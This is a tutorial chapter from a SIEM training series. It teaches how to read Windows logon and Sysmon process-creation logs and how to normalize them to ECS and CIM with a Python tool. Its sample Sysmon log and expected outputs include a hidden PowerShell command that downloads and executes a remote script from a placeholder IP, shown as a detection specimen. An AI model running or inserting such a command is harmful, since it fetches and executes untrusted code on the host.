# Part 1: The Anatomy of a Log — Foundations

*(Builds directly on the `siem-mastery-series/` project root, virtual environment, and Docker sandbox set up in Part 0. If you haven't completed Part 0, do that first — this part assumes `(.venv)` is active and `requirements.txt` is installed.)*

## Why This Part Exists

Analogy: you wouldn't try to translate a foreign novel without first learning its alphabet. Windows logs and Sysmon logs are the "alphabet" of endpoint security — every detection rule in this series, starting in Part 2, is really just a clever sentence built from these raw letters. This part teaches you to read the alphabet, then teaches you to *translate* it into a shared language (ECS/CIM) so the same detection logic can work no matter which SIEM you're using.

---

## Step 1.1 — Create the Part 1 Workspace and Sample Raw Logs

**The Target:** `siem-mastery-series/part-1-log-anatomy/raw_logs/` containing three real-shaped raw log files: a successful logon (4624), a failed logon (4625), and a Sysmon process creation event (Event ID 1).

**The Concept:** Think of this folder as a **specimen tray** in a lab. Before you can identify a pattern across thousands of samples, you study a few specimens up close under a microscope. These three files are our specimens — small, hand-picked, and realistic enough to represent what a real Windows Domain Controller or endpoint agent would actually emit.

**The Implementation:**

```bash
cd siem-mastery-series
mkdir -p part-1-log-anatomy/raw_logs
cd part-1-log-anatomy
```

**File: `siem-mastery-series/part-1-log-anatomy/raw_logs/4624_successful_logon.xml`**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2024-06-15T14:22:03.123456700Z" />
    <EventRecordID>891234</EventRecordID>
    <Correlation />
    <Execution ProcessID="656" ThreadID="123456" />
    <Channel>Security</Channel>
    <Computer>WIN-DC01.corp.local</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-0-0</Data>
    <Data Name="SubjectUserName">-</Data>
    <Data Name="SubjectDomainName">-</Data>
    <Data Name="SubjectLogonId">0x0</Data>
    <Data Name="TargetUserSid">S-1-5-21-3623811015-3361044348-30300820-1013</Data>
    <Data Name="TargetUserName">jdoe</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="TargetLogonId">0x3e7f1a2</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="LogonProcessName">NtLmSsp </Data>
    <Data Name="AuthenticationPackageName">NTLM</Data>
    <Data Name="WorkstationName">WIN-DC01</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="TransmittedServices">-</Data>
    <Data Name="LmPackageName">-</Data>
    <Data Name="KeyLength">0</Data>
    <Data Name="ProcessId">0x0</Data>
    <Data Name="ProcessName">-</Data>
    <Data Name="IpAddress">203.0.113.55</Data>
    <Data Name="IpPort">51322</Data>
  </EventData>
</Event>
```

**File: `siem-mastery-series/part-1-log-anatomy/raw_logs/4625_failed_logon.xml`**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4625</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8010000000000000</Keywords>
    <TimeCreated SystemTime="2024-06-15T14:21:41.556123400Z" />
    <EventRecordID>891229</EventRecordID>
    <Correlation />
    <Execution ProcessID="656" ThreadID="123455" />
    <Channel>Security</Channel>
    <Computer>WIN-DC01.corp.local</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="SubjectUserSid">S-1-0-0</Data>
    <Data Name="SubjectUserName">-</Data>
    <Data Name="SubjectDomainName">-</Data>
    <Data Name="SubjectLogonId">0x0</Data>
    <Data Name="TargetUserSid">S-1-0-0</Data>
    <Data Name="TargetUserName">jdoe</Data>
    <Data Name="TargetDomainName">CORP</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="FailureReason">%%2313</Data>
    <Data Name="SubStatus">0xC000006A</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="LogonProcessName">NtLmSsp </Data>
    <Data Name="AuthenticationPackageName">NTLM</Data>
    <Data Name="WorkstationName">WIN-DC01</Data>
    <Data Name="TransmittedServices">-</Data>
    <Data Name="LmPackageName">-</Data>
    <Data Name="KeyLength">0</Data>
    <Data Name="ProcessId">0x0</Data>
    <Data Name="ProcessName">-</Data>
    <Data Name="IpAddress">203.0.113.55</Data>
    <Data Name="IpPort">51330</Data>
  </EventData>
</Event>
```

**File: `siem-mastery-series/part-1-log-anatomy/raw_logs/sysmon_event_1_process_creation.xml`**

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2024-06-15T14:23:10.998877600Z" />
    <EventRecordID>2456123</EventRecordID>
    <Correlation />
    <Execution ProcessID="3624" ThreadID="4012" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WEB03.corp.local</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
    <Data Name="UtcTime">2024-06-15 14:23:10.987</Data>
    <Data Name="ProcessGuid">{a1b2c3d4-1234-5678-0000-000000001234}</Data>
    <Data Name="ProcessId">8832</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="FileVersion">10.0.19041.1</Data>
    <Data Name="Description">Windows PowerShell</Data>
    <Data Name="Product">Microsoft Windows Operating System</Data>
    <Data Name="Company">Microsoft Corporation</Data>
    <Data Name="OriginalFileName">PowerShell.EXE</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')"</Data>
    <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
    <Data Name="User">CORP\jdoe</Data>
    <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
    <Data Name="LogonId">0x3e7f1a2</Data>
    <Data Name="TerminalSessionId">1</Data>
    <Data Name="IntegrityLevel">Medium</Data>
    <Data Name="Hashes">SHA256=3B4E1F0A9C2D8E7F6A5B4C3D2E1F0A9C2D8E7F6A5B4C3D2E1F0A9C2D8E7F6A</Data>
    <Data Name="ParentProcessGuid">{a1b2c3d4-1234-5678-0000-000000001233}</Data>
    <Data Name="ParentProcessId">4212</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">cmd.exe /c "run.bat"</Data>
    <Data Name="ParentUser">CORP\jdoe</Data>
  </EventData>
</Event>
```

**The Verification:**

```bash
ls -la raw_logs/
```

Expected output:

```
4624_successful_logon.xml
4625_failed_logon.xml
sysmon_event_1_process_creation.xml
```

---

## Step 1.2 — Decode Event ID 4624 (Successful Logon)

**The Target:** A tiny, throwaway Python script that reads `4624_successful_logon.xml` and prints its raw fields — our first real contact with parsing this format.

**The Concept:** Windows Event Log XML always wraps everything in a **default XML namespace** (`xmlns="http://schemas.microsoft.com/win/2004/08/events/event"`). This is the single most common beginner trap: if you search for a tag like `EventID` without accounting for the namespace, most XML libraries return nothing at all — as if the tag doesn't exist. Think of the namespace like a company's internal mail room stamping every envelope with "Property of Acme Corp" — you must include that stamp when addressing your search, or the mail room won't recognize the request as valid.

**The Implementation:**

**File: `siem-mastery-series/part-1-log-anatomy/explore.py`**

```python
"""
A throwaway exploration script. This is NOT the final tool — its only job
is to prove we can correctly read raw fields out of Windows Event Log XML
before we invest in building the full normalizer in Step 1.7.
"""
import sys
from pathlib import Path
from lxml import etree

# Windows Event Log XML always uses this exact namespace URI. We give it a
# name ("ev") so lxml's XPath queries below can reference it explicitly.
WINEVT_NS = {"ev": "http://schemas.microsoft.com/win/2004/08/events/event"}


def dump_raw_fields(xml_path: Path) -> None:
    tree = etree.parse(str(xml_path))
    root = tree.getroot()

    event_id = root.find(".//ev:System/ev:EventID", namespaces=WINEVT_NS)
    computer = root.find(".//ev:System/ev:Computer", namespaces=WINEVT_NS)
    # TimeCreated stores its value as an XML ATTRIBUTE ("SystemTime="...""),
    # not as text between tags -- so we must use .get(), not .text.
    time_created = root.find(".//ev:System/ev:TimeCreated", namespaces=WINEVT_NS)

    print(f"EventID:      {event_id.text}")
    print(f"Computer:     {computer.text}")
    print(f"TimeCreated:  {time_created.get('SystemTime')}")
    print("--- EventData fields ---")

    # Every piece of event-specific detail lives in <Data Name="X">value</Data>
    # elements. We loop through all of them generically -- this is exactly
    # what lets the same code work for 4624, 4625, AND Sysmon events later.
    for data_elem in root.findall(".//ev:EventData/ev:Data", namespaces=WINEVT_NS):
        name = data_elem.get("Name")
        value = data_elem.text
        print(f"  {name}: {value}")


if __name__ == "__main__":
    dump_raw_fields(Path(sys.argv[1]))
```

**The Verification:**

```bash
python3 explore.py raw_logs/4624_successful_logon.xml
```

Expected output (abridged):

```
EventID:      4624
Computer:     WIN-DC01.corp.local
TimeCreated:  2024-06-15T14:22:03.123456700Z
--- EventData fields ---
  SubjectUserSid: S-1-0-0
  SubjectUserName: -
  ...
  TargetUserName: jdoe
  TargetDomainName: CORP
  LogonType: 3
  ...
  IpAddress: 203.0.113.55
  IpPort: 51322
```

**Reading it like an analyst:** `TargetUserName` is *who* logged in. `IpAddress` is *where from*. `LogonType: 3` means a **network logon** (e.g., accessing a file share) — not an interactive keyboard login. This distinction matters enormously later: a brute-force detection (Part 2) almost always looks specifically at LogonType 3 or 10 (RDP), because those are the types attackers use remotely.

---

## Step 1.3 — Decode Event ID 4625 (Failed Logon)

**The Target:** Run the same exploration script against the failed-logon sample, and learn the *new* fields that only appear on failures.

**The Concept:** A failed logon isn't just "4624 without success" — Windows adds entirely new fields (`Status`, `SubStatus`, `FailureReason`) to explain *why* it failed. Think of it like a declined credit card: the receipt doesn't just say "declined," it includes a decline code (insufficient funds vs. stolen card vs. expired) — each one tells a very different story to an investigator.

**The Implementation:** No new code — reuse `explore.py`.

**The Verification:**

```bash
python3 explore.py raw_logs/4625_failed_logon.xml
```

Expected output (abridged):

```
EventID:      4625
Computer:     WIN-DC01.corp.local
TimeCreated:  2024-06-15T14:21:41.556123400Z
--- EventData fields ---
  ...
  TargetUserName: jdoe
  Status: 0xC000006D
  FailureReason: %%2313
  SubStatus: 0xC000006A
  LogonType: 3
  ...
  IpAddress: 203.0.113.55
  IpPort: 51330
```

**Reading it like an analyst:** `Status: 0xC000006D` is a generic "logon failure" code. The real detail is `SubStatus: 0xC000006A`, which specifically means **bad password** (as opposed to `0xC0000064`, which would mean the username doesn't exist at all). `FailureReason: %%2313` is a Windows *message string ID* — Windows stores the human-readable text ("Unknown user name or bad password") separately, and only resolves it when viewed live in Event Viewer. This is a real-world gotcha: raw exported logs often contain these unresolved `%%XXXX` codes, and any serious normalizer must know how to translate them (we'll do this in Step 1.7).

Notice the **same `IpAddress` (203.0.113.55)** appears in both the 4624 and the 4625 sample — same source, one failure, one success. That single detail is the entire premise of the correlation rule we'll build in Part 3.

---

## Step 1.4 — Decode Sysmon Event ID 1 (Process Creation)

**The Target:** Run the exploration script against the Sysmon sample and learn its process-lineage fields.

**The Concept:** Windows Security logs tell you about *logons* (who came through the front door). Sysmon (System Monitor, a free Microsoft tool) tells you about *processes* (what they did once inside the house). The critical concept here is **process lineage** — every process records its own `Image` (the program that ran) *and* its `ParentImage` (the program that launched it). This parent-child chain is how you spot something like "Microsoft Word spawned PowerShell spawned a download" — a textbook malicious document attack chain.

**The Implementation:** No new code — reuse `explore.py`.

**The Verification:**

```bash
python3 explore.py raw_logs/sysmon_event_1_process_creation.xml
```

Expected output (abridged):

```
EventID:      1
Computer:     WIN-WEB03.corp.local
TimeCreated:  2024-06-15T14:23:10.998877600Z
--- EventData fields ---
  RuleName: technique_id=T1059.001,technique_name=PowerShell
  ...
  ProcessId: 8832
  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  ...
  CommandLine: powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')"
  ...
  User: CORP\jdoe
  ...
  ParentProcessId: 4212
  ParentImage: C:\Windows\System32\cmd.exe
  ParentCommandLine: cmd.exe /c "run.bat"
```

**Reading it like an analyst:** Look at the chain: `cmd.exe` (parent) launched `powershell.exe` (child), and that PowerShell command uses `-w hidden` (hidden window) plus `Net.WebClient` to silently download a remote script. Each of those details — hidden window, WebClient, a raw IP instead of a domain name — is a small red flag. None alone proves malice, but stacked together they form the exact detection logic behind **Appendix B's PowerShell WebClient rule**, which we'll formally build in Part 2. This is also tagged directly with `RuleName: technique_id=T1059.001` — Sysmon config files can literally embed the MITRE ATT&CK technique ID right into the rule that triggered the log, which is a huge head start for the tagging discipline this whole series insists on.

---

## Step 1.5 — The Normalization Problem: Why We Need ECS/CIM at All

**The Target:** No code — a conceptual bridge before we build the mapping tables.

**The Concept:** Imagine three witnesses to the same car accident, each speaking a different language, each using different units (mph vs. km/h, feet vs. meters). A detective can't write one set of interview questions that works for all three — unless they first hire a translator to convert every statement into one shared language and one shared unit system. That translator step is exactly what **ECS** and **CIM** do for logs.

- **ECS (Elastic Common Schema):** a standard set of field names (like `source.ip`, `user.name`, `process.command_line`) used across Elastic products, regardless of whether the original log came from Windows, Linux, a firewall, or a cloud API.
- **CIM (Splunk Common Information Model):** Splunk's equivalent — different field names (`src`, `user`, `process`), same underlying idea.

Why this matters concretely: our raw 4624 log calls the username `TargetUserName`. Our Sysmon log calls the username `User`. A firewall log might call it `username`. Without normalization, you'd need to write three completely separate detection rules just to ask "did this user do something suspicious?" — even though it's conceptually the exact same question. Normalize first, and one rule works everywhere.

---

## Step 1.6 — Design the Field Mapping Tables

**The Target:** The design blueprint (as markdown tables) for exactly which raw field maps to which normalized field, for each event type. We design this *before* writing code, the same way an architect draws a floor plan before pouring concrete.

**The Concept:** A mapping table is a **translation dictionary** — literally "this raw word means that standard word."

### ECS Mapping

| Raw Field | Event(s) | ECS Field |
|---|---|---|
| `EventID` | all | `event.code` |
| `Computer` | all | `host.name` |
| `TimeCreated` | all | `@timestamp` |
| `TargetUserName` | 4624, 4625 | `user.name` |
| `TargetDomainName` | 4624, 4625 | `user.domain` |
| `IpAddress` | 4624, 4625 | `source.ip` |
| `IpPort` | 4624, 4625 | `source.port` |
| `LogonType` | 4624, 4625 | `winlog.logon.type` |
| `FailureReason` | 4625 | `winlog.event_data.failure_reason` |
| `Status` | 4625 | `winlog.event_data.status` |
| `SubStatus` | 4625 | `winlog.event_data.sub_status` |
| `User` | Sysmon 1 | `user.name` |
| `ProcessId` | Sysmon 1 | `process.pid` |
| `Image` | Sysmon 1 | `process.executable` |
| `CommandLine` | Sysmon 1 | `process.command_line` |
| `ParentProcessId` | Sysmon 1 | `process.parent.pid` |
| `ParentImage` | Sysmon 1 | `process.parent.executable` |
| `ParentCommandLine` | Sysmon 1 | `process.parent.command_line` |

### CIM Mapping

| Raw Field | Event(s) | CIM Field |
|---|---|---|
| `Computer` | all | `dest` |
| `TimeCreated` | all | `_time` |
| `TargetUserName` | 4624, 4625 | `user` |
| `IpAddress` | 4624, 4625 | `src` |
| `IpPort` | 4624, 4625 | `src_port` |
| `LogonType` | 4624, 4625 | `logon_type` |
| `FailureReason` | 4625 | `reason` |
| `User` | Sysmon 1 | `user` |
| `ProcessId` | Sysmon 1 | `process_id` |
| `Image` | Sysmon 1 | `process_path` |
| `CommandLine` | Sysmon 1 | `process` |
| `ParentProcessId` | Sysmon 1 | `parent_process_id` |
| `ParentImage` | Sysmon 1 | `parent_process_path` |
| `ParentCommandLine` | Sysmon 1 | `parent_process` |

We also need a few **static fields** — values that don't come from the log itself but describe *what kind* of event it is (e.g., `event.outcome: "success"` for 4624). These act like a label a museum curator adds to an artifact — the object itself doesn't say "this is Roman pottery," but the curator's card does.

**The Verification:** Re-read both tables and confirm: for a 4625 event, you could hand-trace `IpAddress: 203.0.113.55` all the way to `source.ip` (ECS) or `src` (CIM) using nothing but this table. If you can do that by hand, you're ready to encode it in Python.

---

## Step 1.7 — Build the Normalizer Engine

**The Target:** `siem-mastery-series/part-1-log-anatomy/normalize.py` — a full, reusable CLI tool that replaces `explore.py` and implements Step 1.6's tables in code.

**The Concept:** This is the "translator" from Step 1.5, made real. It has three jobs, done in order: **(1)** read the raw XML into a flat dictionary (exactly like `explore.py` did), **(2)** look up each raw field name in our mapping table and rename it, **(3)** reshape dotted ECS names (like `source.ip`) into properly nested JSON (`{"source": {"ip": ...}}`), since that's the actual shape ECS documents take in Elasticsearch.

**The Implementation:**

**File: `siem-mastery-series/part-1-log-anatomy/normalize.py`**

```python
"""
normalize.py

Reads a raw Windows Security / Sysmon Event Log XML file and converts it
into either ECS (Elastic Common Schema) or CIM (Splunk Common Information
Model) normalized JSON.

Usage:
    python3 normalize.py raw_logs/4624_successful_logon.xml --schema ecs
    python3 normalize.py raw_logs/4624_successful_logon.xml --schema cim
"""
import argparse
import json
import sys
from pathlib import Path

from lxml import etree
from rich.console import Console
from rich.pretty import pprint

console = Console()

# Windows Event Log XML always uses this exact namespace URI. Every XPath
# query below must reference it via the "ev:" prefix, or lxml will silently
# find nothing -- this is the #1 beginner gotcha with this file format.
WINEVT_NS = {"ev": "http://schemas.microsoft.com/win/2004/08/events/event"}


# ---------------------------------------------------------------------------
# STEP A: Raw parsing -- identical in spirit to Step 1.2-1.4's explore.py,
# but returns a clean dict instead of printing.
# ---------------------------------------------------------------------------
def parse_raw_event(xml_path: Path) -> dict:
    """Flattens a raw Windows/Sysmon XML event into a simple dict of
    field_name -> value, with no renaming or reshaping applied yet."""
    tree = etree.parse(str(xml_path))
    root = tree.getroot()

    event_id_elem = root.find(".//ev:System/ev:EventID", namespaces=WINEVT_NS)
    computer_elem = root.find(".//ev:System/ev:Computer", namespaces=WINEVT_NS)
    time_elem = root.find(".//ev:System/ev:TimeCreated", namespaces=WINEVT_NS)

    raw: dict = {
        "EventID": event_id_elem.text if event_id_elem is not None else None,
        "Computer": computer_elem.text if computer_elem is not None else None,
        # TimeCreated's value lives in the SystemTime ATTRIBUTE, not as text
        # content -- hence .get() rather than .text here.
        "TimeCreated": time_elem.get("SystemTime") if time_elem is not None else None,
    }

    for data_elem in root.findall(".//ev:EventData/ev:Data", namespaces=WINEVT_NS):
        name = data_elem.get("Name")
        if name:
            raw[name] = data_elem.text

    return raw


# ---------------------------------------------------------------------------
# STEP B: Known "message string" translations. Real 4625 events often ship
# with unresolved codes like "%%2313" instead of readable text (see Step 1.3).
# This lookup table resolves the ones relevant to our detection rules later
# in the series. Real environments would use a much larger official table.
# ---------------------------------------------------------------------------
FAILURE_REASON_CODES = {
    "%%2313": "Unknown user name or bad password",
    "%%2304": "An Error occurred during Logon",
    "%%2312": "Account currently disabled",
}


# ---------------------------------------------------------------------------
# STEP C: The mapping tables from Step 1.6, encoded directly in Python.
# "static" = fields that describe the event type itself (not read from raw
# data). "fields" = raw_field_name -> normalized_field_name lookups.
# ---------------------------------------------------------------------------
ECS_MAPPINGS = {
    "4624": {
        "static": {
            "event.code": "4624",
            "event.action": "logon-succeeded",
            "event.category": "authentication",
            "event.outcome": "success",
        },
        "fields": {
            "Computer": "host.name",
            "TargetUserName": "user.name",
            "TargetDomainName": "user.domain",
            "IpAddress": "source.ip",
            "IpPort": "source.port",
            "LogonType": "winlog.logon.type",
        },
    },
    "4625": {
        "static": {
            "event.code": "4625",
            "event.action": "logon-failed",
            "event.category": "authentication",
            "event.outcome": "failure",
        },
        "fields": {
            "Computer": "host.name",
            "TargetUserName": "user.name",
            "TargetDomainName": "user.domain",
            "IpAddress": "source.ip",
            "IpPort": "source.port",
            "LogonType": "winlog.logon.type",
            "FailureReason": "winlog.event_data.failure_reason",
            "Status": "winlog.event_data.status",
            "SubStatus": "winlog.event_data.sub_status",
        },
    },
    "1": {
        "static": {
            "event.code": "1",
            "event.action": "process-created",
            "event.category": "process",
            "event.outcome": "unknown",
        },
        "fields": {
            "Computer": "host.name",
            "User": "user.name",
            "ProcessId": "process.pid",
            "Image": "process.executable",
            "CommandLine": "process.command_line",
            "ParentProcessId": "process.parent.pid",
            "ParentImage": "process.parent.executable",
            "ParentCommandLine": "process.parent.command_line",
        },
    },
}

CIM_MAPPINGS = {
    "4624": {
        "static": {
            "action": "success",
            "app": "windows-security",
            "signature": "An account was successfully logged on",
        },
        "fields": {
            "Computer": "dest",
            "TargetUserName": "user",
            "IpAddress": "src",
            "IpPort": "src_port",
            "LogonType": "logon_type",
        },
    },
    "4625": {
        "static": {
            "action": "failure",
            "app": "windows-security",
            "signature": "An account failed to log on",
        },
        "fields": {
            "Computer": "dest",
            "TargetUserName": "user",
            "IpAddress": "src",
            "IpPort": "src_port",
            "LogonType": "logon_type",
            "FailureReason": "reason",
        },
    },
    "1": {
        "static": {
            "action": "allowed",
            "app": "sysmon",
        },
        "fields": {
            "Computer": "dest",
            "User": "user",
            "ProcessId": "process_id",
            "Image": "process_path",
            "CommandLine": "process",
            "ParentProcessId": "parent_process_id",
            "ParentImage": "parent_process_path",
            "ParentCommandLine": "parent_process",
        },
    },
}


# ---------------------------------------------------------------------------
# STEP D: Reshape dotted ECS keys ("source.ip") into real nested dictionaries
# ({"source": {"ip": ...}}), since that's how ECS documents are actually
# structured in Elasticsearch/Kibana.
# ---------------------------------------------------------------------------
def set_nested(target: dict, dotted_key: str, value) -> None:
    parts = dotted_key.split(".")
    current = target
    for part in parts[:-1]:
        # setdefault: "give me this key's dict, creating an empty one first
        # if it doesn't exist yet" -- avoids overwriting sibling fields.
        current = current.setdefault(part, {})
    current[parts[-1]] = value


def normalize_event(raw: dict, schema: str) -> dict:
    event_id = raw.get("EventID")
    mapping_table = ECS_MAPPINGS if schema == "ecs" else CIM_MAPPINGS

    if event_id not in mapping_table:
        raise ValueError(
            f"No {schema.upper()} mapping defined for EventID '{event_id}'. "
            f"Supported EventIDs: {list(mapping_table.keys())}"
        )

    mapping = mapping_table[event_id]
    normalized: dict = {}

    # Timestamp field name differs by schema, so we handle it once, up front,
    # rather than folding a special case into the generic loop below.
    if schema == "ecs":
        normalized["@timestamp"] = raw.get("TimeCreated")
    else:
        normalized["_time"] = raw.get("TimeCreated")

    for target_key, value in mapping["static"].items():
        if schema == "ecs":
            set_nested(normalized, target_key, value)
        else:
            normalized[target_key] = value

    for raw_key, target_key in mapping["fields"].items():
        if raw_key in raw and raw[raw_key] is not None:
            value = raw[raw_key]

            # Resolve unresolved Windows message codes (Step B) if present.
            if raw_key == "FailureReason" and value in FAILURE_REASON_CODES:
                value = FAILURE_REASON_CODES[value]

            if schema == "ecs":
                set_nested(normalized, target_key, value)
            else:
                normalized[target_key] = value

    return normalized


# ---------------------------------------------------------------------------
# STEP E: Command-line interface
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Normalize raw Windows/Sysmon Event Log XML into ECS or CIM JSON."
    )
    parser.add_argument("xml_file", type=Path, help="Path to the raw .xml log file")
    parser.add_argument(
        "--schema",
        choices=["ecs", "cim"],
        default="ecs",
        help="Target normalization schema (default: ecs)",
    )
    args = parser.parse_args()

    if not args.xml_file.exists():
        console.print(f"[bold red]Error:[/bold red] file not found: {args.xml_file}")
        sys.exit(1)

    try:
        raw_event = parse_raw_event(args.xml_file)
        normalized_event = normalize_event(raw_event, args.schema)
    except ValueError as exc:
        console.print(f"[bold red]Error:[/bold red] {exc}")
        sys.exit(1)

    console.print(f"\n[bold cyan]--- RAW FIELDS ({args.xml_file.name}) ---[/bold cyan]")
    pprint(raw_event)

    console.print(f"\n[bold green]--- NORMALIZED ({args.schema.upper()}) ---[/bold green]")
    print(json.dumps(normalized_event, indent=2))


if __name__ == "__main__":
    main()
```

---

## Step 1.8 — Verify: Run the Normalizer Across All Three Logs and Both Schemas

**The Target:** Prove the full pipeline works end-to-end, for every log type, in both target schemas.

**The Concept:** This is the "final fitting" — trying on the finished suit, not just checking the individual seams. If all six combinations (3 logs × 2 schemas) produce clean, correctly-shaped JSON, Part 1 is complete and Part 2 can safely assume these normalized fields exist.

**The Implementation:** No new code — run the tool built in Step 1.7.

```bash
python3 normalize.py raw_logs/4624_successful_logon.xml --schema ecs
```

Expected normalized output:

```json
{
  "@timestamp": "2024-06-15T14:22:03.123456700Z",
  "event": {
    "code": "4624",
    "action": "logon-succeeded",
    "category": "authentication",
    "outcome": "success"
  },
  "host": {
    "name": "WIN-DC01.corp.local"
  },
  "user": {
    "name": "jdoe",
    "domain": "CORP"
  },
  "source": {
    "ip": "203.0.113.55",
    "port": "51322"
  },
  "winlog": {
    "logon": {
      "type": "3"
    }
  }
}
```

```bash
python3 normalize.py raw_logs/4625_failed_logon.xml --schema cim
```

Expected normalized output:

```json
{
  "_time": "2024-06-15T14:21:41.556123400Z",
  "action": "failure",
  "app": "windows-security",
  "signature": "An account failed to log on",
  "dest": "WIN-DC01.corp.local",
  "user": "jdoe",
  "src": "203.0.113.55",
  "src_port": "51330",
  "logon_type": "3",
  "reason": "Unknown user name or bad password"
}
```

```bash
python3 normalize.py raw_logs/sysmon_event_1_process_creation.xml --schema ecs
```

Expected normalized output:

```json
{
  "@timestamp": "2024-06-15T14:23:10.998877600Z",
  "event": {
    "code": "1",
    "action": "process-created",
    "category": "process",
    "outcome": "unknown"
  },
  "host": {
    "name": "WIN-WEB03.corp.local"
  },
  "user": {
    "name": "CORP\\jdoe"
  },
  "process": {
    "pid": "8832",
    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/payload.ps1')\"",
    "parent": {
      "pid": "4212",
      "executable": "C:\\Windows\\System32\\cmd.exe",
      "command_line": "cmd.exe /c \"run.bat\""
    }
  }
}
```

Finally, confirm error handling works for an unmapped event type. Create a quick test with a fake EventID to make sure the tool fails safely instead of silently producing garbage:

```bash
python3 normalize.py raw_logs/4624_successful_logon.xml --schema xyz
```

Expected: argparse itself rejects it before your code even runs:

```
normalize.py: error: argument --schema: invalid choice: 'xyz' (choose from 'ecs', 'cim')
```

**Checkpoint reached.** You now have a working tool that turns raw Windows/Sysmon logs into standardized ECS or CIM JSON — the exact `source.ip`, `user.name`, and `process.command_line` fields we'll reference by name, without re-deriving them, throughout the rest of this series.

---

# Reference Section — Part 1

*(Deep-dive material, isolated here so the step-by-step build above stayed uninterrupted.)*

## R1.1 — Windows Logon Type Reference

| LogonType | Meaning | Common Attacker Relevance |
|---|---|---|
| 2 | Interactive (physical keyboard/console) | Console-based attacks, rare remotely |
| 3 | Network (e.g., SMB share access) | **Very common in brute force / password spraying** |
| 4 | Batch (scheduled task) | Persistence via scheduled tasks |
| 5 | Service (service account start) | Service account abuse |
| 7 | Unlock (workstation unlock) | Rare in remote attacks |
| 8 | NetworkCleartext (e.g., some web auth) | Credential exposure risk |
| 10 | RemoteInteractive (RDP) | **Very common in RDP brute force** |
| 11 | CachedInteractive (cached domain creds, offline) | Post-compromise, offline logon |

## R1.2 — Windows Logon Failure SubStatus Reference

| SubStatus Code | Meaning |
|---|---|
| `0xC000006A` | Bad password (username is valid) |
| `0xC0000064` | Username does not exist |
| `0xC0000234` | Account locked out |
| `0xC0000072` | Account disabled |
| `0xC0000193` | Account expired |
| `0xC0000071` | Password expired |

## R1.3 — ECS vs. CIM Field Name Cheat Sheet

| Concept | ECS (Elastic) | CIM (Splunk) |
|---|---|---|
| Timestamp | `@timestamp` | `_time` |
| Source IP | `source.ip` | `src` |
| Destination host | `host.name` | `dest` |
| Username | `user.name` | `user` |
| Process path | `process.executable` | `process_path` |
| Full command line | `process.command_line` | `process` |
| Parent process path | `process.parent.executable` | `parent_process_path` |
| Event outcome | `event.outcome` | `action` |

## R1.4 — Why We Chose a Subset (Scope Note)

Real ECS has 1000+ possible fields; real CIM has dozens of data models (Authentication, Endpoint, Network Traffic, Web, etc.). This part intentionally implements only the fields our Part 2–4 detection rules actually consume. When you later extend `normalize.py` for your own environment, add fields the same way: pick the raw field, decide its ECS *and* CIM name, add one line to each mapping dict.

## R1.5 — Forward Pointer: MITRE ATT&CK Tags Introduced in This Part

| Event Observed | ATT&CK Technique | Formally Built In |
|---|---|---|
| Repeated 4625, same source IP | T1110 – Brute Force | Part 2 |
| 4625 → 4624 same IP within minutes | T1110 (sequence) | Part 3 |
| PowerShell + `Net.WebClient` download | T1059.001 – PowerShell | Part 2 (Appendix B rule) |

## R1.6 — Full File Tree After Part 1

```
siem-mastery-series/
├── .venv/
├── docker-compose.yml
├── requirements.txt
└── part-1-log-anatomy/
    ├── explore.py
    ├── normalize.py
    └── raw_logs/
        ├── 4624_successful_logon.xml
        ├── 4625_failed_logon.xml
        └── sysmon_event_1_process_creation.xml
```

---

Ready for **Part 2: Writing Your First Rules (KQL vs. SPL vs. Lucene)** whenever you are — it will consume the exact `source.ip`, `user.name`, and `event.outcome` fields you just built, feeding them into a real Brute Force (T1110) detection written in both Splunk SPL and Sentinel KQL.
